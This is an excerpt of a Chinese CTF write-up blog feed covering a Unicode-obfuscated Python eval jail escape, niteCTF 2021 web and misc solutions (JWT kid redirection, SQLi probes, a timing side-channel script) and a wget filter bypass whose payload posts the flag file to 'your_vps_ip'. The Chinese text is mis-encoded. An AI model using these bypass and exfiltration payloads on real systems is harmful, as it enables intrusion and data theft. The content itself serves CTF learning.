∞&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;‚Å±&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39; ≤&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µè&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;À°&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;·µê&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;‚Åø&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;¬∫&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µñ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;ÔΩë&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39; ≥&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;À¢&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;‚Çú&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µò&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·µõ&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39; ∑&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;À£&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39; ∏&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;·∂ª&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#75715e"># payload = &amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;))&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;print(__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat flag.txt&amp;#39;))&amp;#34;&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;·µâ·µõ¬™À°(&amp;#39;&amp;#39;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;+·∂ú ∞ ≥(&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)&amp;#34;&lt;/span>
&lt;span style="color:#111">exploit&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># ·µâ·µõ¬™À°(&amp;#39;&amp;#39;+·∂ú ∞ ≥(112)+·∂ú ∞ ≥(114)+·∂ú ∞ ≥(105)+·∂ú ∞ ≥(110)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(40)+·∂ú ∞ ≥(95)+·∂ú ∞ ≥(95)+·∂ú ∞ ≥(105)+·∂ú ∞ ≥(109)+·∂ú ∞ ≥(112)+·∂ú ∞ ≥(111)+·∂ú ∞ ≥(114)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(95)+·∂ú ∞ ≥(95)+·∂ú ∞ ≥(40)+·∂ú ∞ ≥(39)+·∂ú ∞ ≥(111)+·∂ú ∞ ≥(115)+·∂ú ∞ ≥(39)+·∂ú ∞ ≥(41)+·∂ú ∞ ≥(46)+·∂ú ∞ ≥(115)+·∂ú ∞ ≥(121)+·∂ú ∞ ≥(115)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(101)+·∂ú ∞ ≥(109)+·∂ú ∞ ≥(40)+·∂ú ∞ ≥(39)+·∂ú ∞ ≥(99)+·∂ú ∞ ≥(97)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(32)+·∂ú ∞ ≥(102)+·∂ú ∞ ≥(108)+·∂ú ∞ ≥(97)+·∂ú ∞ ≥(103)+·∂ú ∞ ≥(46)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(120)+·∂ú ∞ ≥(116)+·∂ú ∞ ≥(39)+·∂ú ∞ ≥(41)+·∂ú ∞ ≥(41))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êõ¥Â§öÁöÑÁõ∏‰ººunicodeÂèØ‰ª•ÂèÇËÄÉËøô‰∏™ÁΩëÁ´ô-&amp;gt;https://www.compart.com/en/unicode&lt;/p>
&lt;pre tabindex="0">&lt;code># ËøôÊ†∑ÁöÑ‰πüÂèØ‰ª•Êçè
ÔΩêÔΩíÔΩâÔΩéÔΩî(ÔΩèÔΩêÔΩÖÔΩé(ÔΩÉÔΩàÔΩí(102) + ÔΩÉÔΩàÔΩí(108) + ÔΩÉÔΩàÔΩí(97) + ÔΩÉÔΩàÔΩí(103) + ÔΩÉÔΩàÔΩí(46) + ÔΩÉÔΩàÔΩí(116) + ÔΩÉÔΩàÔΩí(120) + ÔΩÉÔΩàÔΩí(116)).ÔΩíÔΩÖÔΩÅÔΩÑ(115))
&lt;/code>&lt;/pre>&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html">WAF Bypassing with Unicode Compatibility&lt;/a>&lt;/p>
&lt;hr>
&lt;p>&lt;del>Â∞ë‰∫Ü‰∏âÈÅìjsÁöÑÈ¢òÔºåÊàëÁöÑÔºå‰∏ãÊ¨°‰∏ÄÂÆöÔºÅ&lt;/del>&lt;/p>
&lt;p>Áé∞Âú®Â∞ë2ÈÅì‰∫Ü&lt;/p>
&lt;p>Âè¶Â§ñsteghide-as-a-serviceËøôÈÅìÈ¢òÊÑüË∞¢Â∏àÂÇÖÁöÑÂ∏ÆÂä©ÔºàÊàëËá™Â∑±Âç°Âà∞‰∏Ä‰∏™ÂæàË†¢ÁöÑÂú∞Êñπ‰∫Ü&lt;/p>
&lt;p>ÊúÄËøëÊúâÁÇπÊëÜÁÉÇÔºåÂ±û‰∫éÊòØÊò•Âõ∞Áßã‰πèÈáåÈù¢ÁöÑÂÜ¨Áú†‰∫ÜÔºåÁù°‰∏çÈÜíÁöÑÂÜ¨‰∏âÊúàÂïäÂïäÂïäÂïäÂïäÂïä&lt;/p>
&lt;p>Âåó‰∫¨ÂÜ¨Ëá≥ÁöÑÊó∂ÂÄôÊó•Âá∫Êó•ËêΩ‰πãÈó¥Âè™Êúâ9‰∏™ÂçäÂ∞èÊó∂‰∏çÂà∞ÔºåË∞ÅÂê¨‰∫Ü‰∏çÊÉ≥Áù°Ê≠ªËøáÂéªÔºà&lt;/p></description></item><item><title>niteCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/</link><pubDate>Sun, 12 Dec 2021 23:12:52 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/</guid><description>&lt;p>&lt;a href="http://ctf.cryptonite.team/challenges">http://ctf.cryptonite.team/challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://ctftime.org/event/1449">https://ctftime.org/event/1449&lt;/a>&lt;/p>
&lt;h2 id="webwelcome-to-nitectf">Web/welcome to niteCTF&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>welcome&lt;/strong> &lt;strong>baby&lt;/strong>&lt;/p>
&lt;p>Go to the &lt;a href="https://capturetheflag.cryptonite.team/">https://capturetheflag.cryptonite.team&lt;/a> and copy the flag, it&amp;rsquo;s that simple!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205533558.png" alt="image-20211212205533558">&lt;/p>
&lt;p>f12ÁªôÊï¥‰∫Ü‰∏™b64ÔºåËß£Á†Å‰πãÂêéÊòØCryptoniteÔºåÂæàÈÅóÊÜæÂÆÉÂπ∂‰∏çÊòØflag&lt;/p>
&lt;p>ÊäìÂåÖÂêéÁúãÂà∞Êúâjsfuck&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205758869.png" alt="image-20211212205758869">&lt;/p>
&lt;p>&amp;lsquo;Organized by Cryptonite Manipal&amp;rsquo;&lt;/p>
&lt;p>‰πü‰∏çÊòØflagÔºåÂ∞±ÂæàÈ∏°Ë¥ºÔºåÂú®Âè¶‰∏Ä‰∏™jsÊñá‰ª∂‰∏≠&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210259142.png" alt="image-20211212210259142">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210245571.png" alt="image-20211212210245571">&lt;/p>
&lt;h2 id="webbatchest">Web/BATCHEST&lt;/h2>
&lt;blockquote>
&lt;p>My friend just opened a new zoo, so I made him a site to check if his zoo has those animals. &lt;a href="https://blindsqli-web.chall.cryptonite.team/">https://blindsqli-web.chall.cryptonite.team/&lt;/a>&lt;/p>
&lt;p>Author: SPEED&lt;/p>
&lt;/blockquote>
&lt;p>ÊääÁõ≤Ê≥®ÁöÑÊèêÁ§∫ÂÜôÂà∞url‰∏≠‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213444605.png" alt="image-20211212213444605">&lt;/p>
&lt;p>ÂÆÉÁöÑÂõûÊòæÂè™ÊúâÊúâÂíåÊ≤°Êúâ‰∏§ÁßçÔºåÊâÄ‰ª•ÈúÄË¶Åchar-by-charÁ±ªÂûãÁöÑÁõ≤Ê≥®&lt;/p>
&lt;p>‰∏çËøáËøôÈáåË¶ÅÊ≥®ÊÑè&lt;code>lion'or '1' #&lt;/code>ËøîÂõû‰∫Ü500ÔºåËÄå&lt;code>lion'or '1' -- &lt;/code>ËøîÂõûÊ≠£Â∏∏ÔºåËØ¥ÊòéËøôÈáåÁöÑÊï∞ÊçÆÂ∫ìÊòØsqliteÔºåÁî®ÁöÑÊòØ&lt;code>sqlite_master&lt;/code>Êù•Ëé∑Âèñ‰ø°ÊÅØ&lt;/p>
&lt;pre tabindex="0">&lt;code># ËÑöÊú¨Êàë‰πãÂêéÂÆåÂñÑ‰∏Ä‰∏ã
# ‰πãÂâçÂÜô‰∫Ü‰∏Ä‰∏™ÈÄöÁî®ÁöÑchar-by-char-sqliÁöÑÊ®°Êùø
# ‰ΩÜÊòØÂèëÁé∞ËÄ¶ÂêàÊÄßÂ§™È´ò‰∫Ü
# ËøòÊòØÊåâÂäüËÉΩÂàÜÂºÄÂáΩÊï∞ÂÜôÊØîËæÉÂ•Ω
# ÂæÖÂÆåÂñÑ‰∏≠XD
# ÁÑ∂ÂêéÁúãÂà∞‰∫Ü‰∏Ä‰∏™Êà™Âõæ
# ÂØπÂì¶ ‰ªñÂ¶àÁöÑ‰∏∫‰ªÄ‰πàÁõ≤Ê≥®ËøôÁßç‰∏úË•ø‰∏çÁõ¥Êé•Áî®burp-intruderÂë¢ÔºüÔºüÔºüÔºüÔºüÔºüÔºü
# ÔºüÔºüÔºüÔºü
# Á™ÅÁÑ∂ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂçéÁÇπ
# ËøòÂÜô‰∏™pÁöÑËÑöÊú¨ Áî®burp
# ÂºÄÁé©Á¨ëÁöÑ ÂêÑÊúâÂêÑÁöÑÂ∫îÁî®Âú∫ÊôØ
&lt;/code>&lt;/pre>&lt;h2 id="webjwt">Web/JWT&lt;/h2>
&lt;blockquote>
&lt;p>Jason likes cookies but he is diabetic. So his mom stored them away somewhere safe. Can you help him find the path that leads to the solution for his hungry desires?&lt;/p>
&lt;p>&lt;a href="https://jwt-web.challenge.cryptonite.team/">https://jwt-web.challenge.cryptonite.team&lt;/a> http://35.201.116.81/&lt;/p>
&lt;p>Author: LatinArceus&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011510158.png" alt="image-20211212011510158">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011548007.png" alt="image-20211212011548007">&lt;/p>
&lt;p>Êàë‰ª¨Âæó‰º™ÈÄ†‰∏Ä‰∏™&lt;code>&amp;quot;admin_cap&amp;quot;:&amp;quot;true&amp;quot;&lt;/code>ÁöÑcookieÔºåÊ≥®ÊÑèÂà∞ËøôÈáåÁöÑ&lt;code>kid&lt;/code>ÊåáÂêëÁöÑÊòØÊúçÂä°Âô®Êú¨Âú∞ÁöÑsecret.txtÔºåÈÇ£Êàë‰ª¨Âè™ÈúÄË¶ÅÊääÂÆÉÊåáÂêëÊàë‰ª¨Ëá™Â∑±ÁöÑsecret.txtÂ∞±Â•Ω‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205136265.png" alt="image-20211212205136265">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205200492.png" alt="image-20211212205200492">&lt;/p>
&lt;p>&lt;code>nite{R3diR3ct10n_c4n_b3_4_vuLn_t0O}&lt;/code>&lt;/p>
&lt;h2 id="misclets-be-artistic">Misc/Let&amp;rsquo;s be Artistic&lt;/h2>
&lt;blockquote>
&lt;p>We have received some encoded message from an art gallery. Can you trace it back to the flag? The flag is all uppercase. Wrap it in flag format nite{}&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>87yhnmkj 5rfvbnju76 5rfvbnju76 tyjnbg tyjnbg 5rfc6ygn cft6yhn efvgyjmko 9ikm xdr5thnji9 87yhnmkj
&lt;/code>&lt;/pre>&lt;p>ÈîÆÁõòÊâìÂ≠óÁöÑËΩ®Ëøπ &lt;del>ÔºàÂú®ÈîÆÁõò‰∏äÊííÊääÁ±≥ È∏°Ë∑ëÁöÑË∑ØÁ∫ø&lt;/del>&lt;/p>
&lt;p>&lt;code>nite{GOODDRAWING}&lt;/code>&lt;/p>
&lt;h2 id="miscslow-passwords">Misc/Slow Passwords&lt;/h2>
&lt;blockquote>
&lt;p>We made ourselves super secure by a random password authentication every time the connection is established. Is it really that secure?&lt;/p>
&lt;p>&lt;code>nc slow-passwords.challenge.cryptonite.team 1337&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ÂàöÂºÄÂßãÈÉΩÊ≤°ÊòéÁôΩÂï•ÊÑèÊÄùÔºåÁúã‰∫ÜwpÁü•ÈÅì‰∫Ü&lt;/p>
&lt;p>ÊØèÊ¨°ËøûÊé•ÊúçÂä°Âô®ÁîüÊàê‰∏çÂêåÁöÑpasswdÔºåÂÖÅËÆ∏ÊØèÊ¨°1‰∏™Â≠óÁ¨¶Ëæì3Ê¨°Ôºå‰ΩÜÊòØËæìÂÖ•‰∏çÂêåÂ≠óÁ¨¶ÁöÑÂìçÂ∫îÊó∂Èó¥ÊòØ‰∏çÂêåÁöÑÔºåÊúâÁöÑÈïøÊúâÁöÑÁü≠ÔºåÊàë‰ª¨ÂèØ‰ª•Êâæ‰∏™ÂèÇÁÖßÂ≠óÁ¨¶ÔºàÊØîÂ¶Ç&lt;code>'a'&lt;/code>ÔºâÔºåÈÄöËøáÂìçÂ∫îÊó∂Èó¥Ë∑ü&lt;code>'a'&lt;/code>ÊâÄËä±ÁöÑÊó∂Èó¥ÁöÑÂÅèÁßªÈáèÊù•Âà§Êñ≠ÊòØÂê¶Ê≠£Á°ÆÔºàÁõ∏ÂΩì‰∫é‰∏ÄÁßçÂèòÁõ∏ÁöÑÊó∂Èó¥Áõ≤Ê≥®‰∫ÜÔºâÔºå‰ªéËÄåËÆ°ÁÆóÂá∫‰∏ã‰∏Ä‰∏™ËØ•ËæìÂÖ•ÁöÑÂ≠óÁ¨¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">time&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">remote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;slow-passwords.challenge.cryptonite.team&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvlines&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">curr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;start:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">curr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">curr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sendline&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">start&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">end&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">time&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">offset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">end&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;offset:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">next&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sendline&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">next&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recvline&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213101123.png" alt="image-20211212213101123">&lt;/p>
&lt;p>ÂæàÂ∑ßÂ¶ôÁöÑÁî®Ê≥ïÔºÅËøô‰∏™ÊïÖ‰∫ãÂëäËØâÊàë‰ª¨char-by-charÁ±ªÂûãÁöÑÁõ≤Ê≥®ÁúüÁöÑÊòØÂú®‰ª•ÂêÑÁßçÂêÑÊ†∑ÁöÑÂΩ¢ÂºèÂõõÂ§ÑÂºÄËä±ÔºåÂú®ÂæàÂ§öÂú∫ÂêàÈÉΩËÉΩÁî®ÁöÑ‰∏ä&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://github.com/jontay999/CTF-writeups/tree/master/niteCTF/Misc/slow_passwords">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>ÊúÄËøëÂà∑È¢òÂà∞buuojÁ¨¨7È°µ‰∫ÜÔºåÂ≠¶Ê†°‰πüÂà∞Á¨¨15Âë®ÁöÑÊïôÂ≠¶Âë®‰∫ÜÔºåËøôÂë®ËøòÊúâÂõõÁ∫ßÔºåÊï¥‰∏™‰∫∫ÔºåÊúâÁÇπÈöæÈ°∂ÁöÑ&lt;/p>
&lt;p>ÊâÄ‰ª•ÔºÅÊàëÈÄâÊã©ÂΩì‰∏ÄÂè™È∏µÈ∏üÔºåÊú¨ÁùÄÔºöËΩ¶Âà∞Â±±ÂâçÂøÖÊúâË∑ØÔºåËàπÂà∞Ê°•Â§¥Ëá™ÁÑ∂Áõ¥ÁöÑÊÄÅÂ∫¶ËøéÊù•ÂØíÂÅáÂâçËøôÊÆµÊó∂Èó¥ÔºÅ&lt;/p>
&lt;p>Â§™Â§öÁöÑflagÂ∞±‰∏çÁ´ã‰∫ÜÔºåÁ´ãÂøÉÈáå‰∫Ü&lt;/p></description></item><item><title>Ê∑±ËÇ≤ÊùØ2021 Wp</title><link>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</link><pubDate>Wed, 17 Nov 2021 19:11:38 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/17/jueyucup-2021-wp/</guid><description>&lt;h2 id="fakewget">FakeWget&lt;/h2>
&lt;blockquote>
&lt;p>Âà©Áî®sh‰∏ãgrepÂëΩ‰ª§Ê≠£ÂàôÁº∫Èô∑ÁªïËøáÊ≠£ÂàôÊ£ÄÊü•&lt;/p>
&lt;/blockquote>
&lt;p>Ëøô‰∏™È¢òÔºåÂ∞±ÈùûÂ∏∏ÁöÑÂèØÊÉúÔºåÂÖ∑‰ΩìÁöÑÂ∞±‰∏çËØ¥‰∫ÜÔºåÂ§™‰∏¢‰∫∫‰∫ÜÔºåÊÄª‰πãÂçÅÂàÜÊãâË∑®ÔºåÁâπÂà´ÂèØÊÉúÔºåÁ©∂ÊûÅ‰∏ãÈ•≠„ÄÇ&lt;/p>
&lt;p>Êâ´ÁõÆÂΩïÔºåÂæóÂà∞/consoleÔºå/wgetÔºå/flagÈ°µÈù¢ÂæóÂà∞ÊèêÁ§∫flagÂú®/flag_is_here&lt;/p>
&lt;p>/wgetÂèØ‰ª•ÂèëÈÄÅurlËøõË°åwgetÁöÑÊìç‰ΩúÔºåË∑ücurl‰∏ÄÊ†∑Ôºå‰πüÊòØÂèØ‰ª•ÂèëÈÄÅpostËØ∑Ê±ÇÊª¥ÔºåËøôÈáåÂØπËæìÂÖ•ÁöÑurlÊúâÊ£ÄÊµãÔºå‰∏çÂÖÅËÆ∏ÊúâÁ©∫Ê†ºÂíå‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶&lt;/p>
&lt;p>ËøôÈáåÂÖ∂ÂÆûÊúâ‰∏™ÂéüÈ¢ò&lt;a href="https://www.gem-love.com/ctf/2745.html">[Á∫µÊ®™ÊùØ 2020]magic_download&lt;/a>ÔºåÂá†‰πéÊòØ‰∏ÄÊ†∑ÁöÑÔºåshÂú®grepÊó∂ÂèØ‰ª•Áî®Êç¢Ë°åÁöÑÊìç‰ΩúÊù•ÁªïËøá&lt;/p>
&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">senduri&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://your_vps_ip:port/\\n?\t--post-file=flag_is_here&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">JSEncrypt&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">publicKey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;-----BEGIN PUBLIC KEY-----\
&lt;/span>&lt;span style="color:#d88200">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\
&lt;/span>&lt;span style="color:#d88200">eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\
&lt;/span>&lt;span style="color:#d88200">+f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\
&lt;/span>&lt;span style="color:#d88200">MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\
&lt;/span>&lt;span style="color:#d88200">94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\
&lt;/span>&lt;span style="color:#d88200">H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\
&lt;/span>&lt;span style="color:#d88200">rwIDAQAB\
&lt;/span>&lt;span style="color:#d88200">-----END PUBLIC KEY-----&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setPublicKey&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">publicKey&lt;/span>&lt;span style="color:#111">);&lt;/span>
